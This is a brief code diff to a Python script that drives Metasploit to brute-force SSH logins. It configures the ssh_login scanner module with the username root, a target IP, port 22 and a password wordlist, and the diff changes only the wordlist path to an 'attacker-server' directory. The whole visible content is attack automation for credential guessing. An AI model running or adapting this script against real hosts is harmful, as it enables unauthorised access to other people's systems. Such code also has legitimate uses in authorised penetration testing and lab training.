@@ -29,7 +29,7 @@ def main(argv):
 
     # put the attack launch command
     auxiliary = client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
-    auxiliary['PASS_FILE'] = "/home/kali/Desktop/reinstall/unix_passwords_modified.txt"
+    auxiliary['PASS_FILE'] = "/home/attacker-server/Desktop/reinstall/unix_passwords_modified.txt"
     auxiliary['USERNAME'] = "root"
     auxiliary['RHOSTS'] = target_ip
     auxiliary['RPORT'] = 22
